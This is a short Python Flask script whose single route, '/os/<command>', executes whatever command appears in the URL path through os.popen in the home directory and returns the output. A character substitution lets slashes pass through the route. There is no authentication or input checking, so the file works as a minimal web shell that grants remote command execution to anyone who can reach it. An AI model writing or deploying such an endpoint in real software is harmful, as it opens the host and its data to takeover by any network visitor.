from os import popen
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/os/<command>')
def os(command): return {"output": f"""{popen(f'''cd ~/ && {command.replace("¹", "/")}''').read()}"""}